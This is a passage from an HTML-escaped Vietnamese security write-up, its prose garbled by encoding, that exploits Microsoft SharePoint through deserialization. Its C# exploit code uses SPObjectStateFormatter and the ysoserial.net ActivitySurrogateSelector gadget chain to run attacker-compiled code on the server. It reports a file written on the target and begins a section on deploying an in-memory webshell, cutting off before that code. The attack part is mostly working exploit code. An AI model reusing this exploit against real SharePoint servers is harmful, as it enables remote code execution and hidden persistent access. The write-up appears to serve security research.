&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;RedirectStandardOutput&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;true&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;UseShellExecute&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;false&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;CreateNoWindow&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;true&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;var&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Process&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Start&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;psi&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;string&lt;/span&gt; &lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;StandardOutput&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ReadToEnd&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Trim&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;WaitForExit&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;byte&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="n"&gt;bytes&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Convert&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;FromBase64String&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;DataSetMarshalMod&lt;/span&gt; &lt;span class="n"&gt;marshal&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;new&lt;/span&gt; &lt;span class="n"&gt;DataSetMarshalMod&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;bytes&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;ArrayList&lt;/span&gt; &lt;span class="n"&gt;myAl&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;new&lt;/span&gt; &lt;span class="n"&gt;ArrayList&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;myAl&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Add&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;marshal&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;object&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="n"&gt;parametersArray&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;new&lt;/span&gt; &lt;span class="n"&gt;object&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="n"&gt;myAl&lt;/span&gt; &lt;span class="p"&gt;};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;string&lt;/span&gt; &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;SPSerializer&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Invoke&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;spformatter&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;parametersArray&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;Console&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;WriteLine&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Tá»•ng há»£p láº¡i, request khai thÃ¡c cuá»‘i cÃ¹ng sáº½ nhÆ° nÃ y:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/r1kvMokSWe.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Máº·c dÃ¹ tráº£ vá» 401 nhÆ°ng chá»©c nÄƒng nÃ y Ä‘Ã£ Ä‘Æ°á»£c thá»±c thi (Sharepoint cÃ³ nhiá»u Ä‘oáº¡n return 401 quÃ¡ vÃ  mÃ¬nh cÅ©ng lÆ°á»i trace). Má»Ÿ mÃ¡y cháº¡y sharepoint lÃªn lÃ  ta tháº¥y ngay file pwn.txt:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/ryaKMj1S-l.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;&lt;/p&gt;
&lt;h2 id="iii-deploy-memory-webshell"&gt;III. Deploy Memory Webshell
&lt;/h2&gt;&lt;p&gt;MÃ¬nh chá»n route memory webshell Ä‘á»ƒ inject vÃ¬ nÃ³ cÃ³ thá»ƒ inject vÃ o cáº£ WebMVC vÃ  WebForms, cÅ©ng nhÆ° khÃ¡ dá»… code. Äá»ƒ hiá»ƒu rÃµ hÆ¡n vá» Route Memory Webshell hoáº¡t Ä‘á»™ng nhÆ° tháº¿ nÃ o thÃ¬ cÃ³ thá»ƒ ngÃ³ qua &lt;a class="link" href="https://kev1n1203.github.io/p/memshell-dotnet" target="_blank" rel="noopener"
&gt;Memshell in dotnet&lt;/a&gt; cá»§a mÃ¬nh.&lt;br&gt;
Táº¡i Ä‘Ã¢y mÃ¬nh dÃ¹ng gadgetchain ActivitySurrogateSelector Ä‘á»ƒ load code C#, gadgetchain nÃ y trong tool yso máº·c Ä‘á»‹nh sáº½ láº¥y binary tá»« file E.cs Ä‘á»ƒ load nhÆ°ng mÃ¬nh test thÃ¬ tháº¥y khÃ¡ nháº¥p nhÃ¡y nÃªn mÃ¬nh Ä‘Ã£ chá»n compile file nÃ y thÃ nh dll rá»“i load (works everytime).&lt;br&gt;
VÃ¬ chain nÃ y náº¿u nhÆ° vá»›i ver dotNet &amp;gt; 4.7 thÃ¬ cáº§n pháº£i disable type check, nÃªn mÃ¬nh Ä‘i check ver dotnet cá»§a Sharepoint:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;span class="lnt"&gt;3
&lt;/span&gt;&lt;span class="lnt"&gt;4
&lt;/span&gt;&lt;span class="lnt"&gt;5
&lt;/span&gt;&lt;span class="lnt"&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;PS C:\Users\sp_farmadmin&amp;gt; Set-Location &amp;#39;HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Client&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;PS HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Client&amp;gt; Get-ItemProperty -Path . | Select-Object Version
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Version
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;-------
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;4.5.51641
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Ngon luÃ´n, thá»­ test deser load C# code trÆ°á»›c nÃ o.&lt;br&gt;
File E.cs mÃ¬nh sá»­a tÃ­ tá»« file máº·c Ä‘á»‹nh thÃ´i:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;span class="lnt"&gt;3
&lt;/span&gt;&lt;span class="lnt"&gt;4
&lt;/span&gt;&lt;span class="lnt"&gt;5
&lt;/span&gt;&lt;span class="lnt"&gt;6
&lt;/span&gt;&lt;span class="lnt"&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;class E {
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; public E(){
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; HttpContext.Current.Response.AddHeader(&amp;#34;kev1n-header-custom&amp;#34;, &amp;#34;muhehehehe&amp;#34;);
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; HttpContext.Current.Response.Cookies.Add(new HttpCookie(&amp;#34;skibidi&amp;#34;, &amp;#34;dopdopyesyes&amp;#34;));
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; HttpContext.Current.Response.End();
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Sá»­a láº¡i script exploit pháº§n call nhÆ° sau:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;span class="lnt"&gt;16
&lt;/span&gt;&lt;span class="lnt"&gt;17
&lt;/span&gt;&lt;span class="lnt"&gt;18
&lt;/span&gt;&lt;span class="lnt"&gt;19
&lt;/span&gt;&lt;span class="lnt"&gt;20
&lt;/span&gt;&lt;span class="lnt"&gt;21
&lt;/span&gt;&lt;span class="lnt"&gt;22
&lt;/span&gt;&lt;span class="lnt"&gt;23
&lt;/span&gt;&lt;span class="lnt"&gt;24
&lt;/span&gt;&lt;span class="lnt"&gt;25
&lt;/span&gt;&lt;span class="lnt"&gt;26
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-gdscript3" data-lang="gdscript3"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;static&lt;/span&gt; &lt;span class="n"&gt;void&lt;/span&gt; &lt;span class="n"&gt;Main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;var&lt;/span&gt; &lt;span class="n"&gt;spformatter&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Activator&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CreateInstance&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;Microsoft.SharePoint, Version=15.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;Microsoft.SharePoint.WebPartPages.SPObjectStateFormatter&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Unwrap&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;MethodInfo&lt;/span&gt; &lt;span class="n"&gt;SPSerializer&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;spformatter&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetType&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetMethod&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;Serialize&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;new&lt;/span&gt; &lt;span class="n"&gt;Type&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nb"&gt;typeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;object&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;});&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;Process&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Start&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;C:\Windows\Microsoft.NET\Framework64&lt;/span&gt;&lt;span class="se"&gt;\v&lt;/span&gt;&lt;span class="s2"&gt;4.0.30319\csc.exe&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;/target:library /out:ysoserial-net\E.dll ysoserial-net\E.cs&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="err"&gt;?&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;WaitForExit&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;var&lt;/span&gt; &lt;span class="n"&gt;psi&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;new&lt;/span&gt; &lt;span class="n"&gt;ProcessStartInfo&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;ysoserial.exe&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;-f BinaryFormatter -g ActivitySurrogateSelector -c &amp;#34;&amp;#34;1337&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;RedirectStandardOutput&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;true&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;UseShellExecute&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;false&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;CreateNoWindow&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;true&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;var&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Process&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Start&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;psi&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;string&lt;/span&gt; &lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;StandardOutput&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ReadToEnd&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Trim&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;WaitForExit&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="n"&gt;Console&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;WriteLine&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;byte&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="n"&gt;bytes&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Convert&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;FromBase64String&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;DataSetMarshalMod&lt;/span&gt; &lt;span class="n"&gt;marshal&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;new&lt;/span&gt; &lt;span class="n"&gt;DataSetMarshalMod&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;bytes&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;ArrayList&lt;/span&gt; &lt;span class="n"&gt;myAl&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;new&lt;/span&gt; &lt;span class="n"&gt;ArrayList&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;myAl&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Add&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;marshal&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;object&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="n"&gt;parametersArray&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;new&lt;/span&gt; &lt;span class="n"&gt;object&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="n"&gt;myAl&lt;/span&gt; &lt;span class="p"&gt;};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;string&lt;/span&gt; &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;SPSerializer&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Invoke&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;spformatter&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;parametersArray&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="ne"&gt;File&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;WriteAllText&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;objstate.txt&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;Console&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;WriteLine&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Gen thÃ nh payload vÃ  send request, response cÃ³ chá»©a cookie vÃ  header mÃ¬nh set:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/SyS7Lj1B-e.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Sá»­a code file E.cs thÃ nh code deploy memshell:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;span class="lnt"&gt;16
&lt;/span&gt;&lt;span class="lnt"&gt;17
&lt;/span&gt;&lt;span class="lnt"&gt;18
&lt;/span&gt;&lt;span class="lnt"&gt;19
&lt;/span&gt;&lt;span class="lnt"&gt;20
&lt;/span&gt;&lt;span class="lnt"&gt;21
&lt;/span&gt;&lt;span class="lnt"&gt;22
&lt;/span&gt;&lt;span class="lnt"&gt;23
&lt;/span&gt;&lt;span class="lnt"&gt;24
&lt;/span&gt;&lt;span class="lnt"&gt;25
&lt;/span&gt;&lt;span class="lnt"&gt;26
&lt;/span&gt;&lt;span class="lnt"&gt;27
&lt;/span&gt;&lt;span class="lnt"&gt;28
&lt;/span&gt;&lt;span class="lnt"&gt;29
&lt;/span&gt;&lt;span class="lnt"&gt;30
&lt;/span&gt;&lt;span class="lnt"&gt;31
&lt;/span&gt;&lt;span class="lnt"&gt;32
&lt;/span&gt;&lt;span class="lnt"&gt;33
&lt;/span&gt;&lt;span class="lnt"&gt;34
&lt;/span&gt;&lt;span class="lnt"&gt;35
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
